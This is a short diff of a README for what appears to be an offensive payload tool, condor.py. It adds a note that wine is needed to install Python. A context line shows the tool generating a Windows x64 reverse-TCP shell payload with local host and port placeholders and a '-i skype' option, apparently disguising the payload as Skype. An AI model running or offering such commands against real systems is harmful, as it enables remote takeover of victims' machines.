@@ -44,3 +44,7 @@ $ sudo ./install.sh
 ...
 $ python3 condor.py -p windows/x64/shell/reverse_tcp -lh <LOCAL HOST> -lp <LOCAL PORT> -i skype
 ```
+
+It is necessary to have wine installed on the machine to be able to install Python. Install as shown in the screenshot:
+
+![](assets/python-install.png)
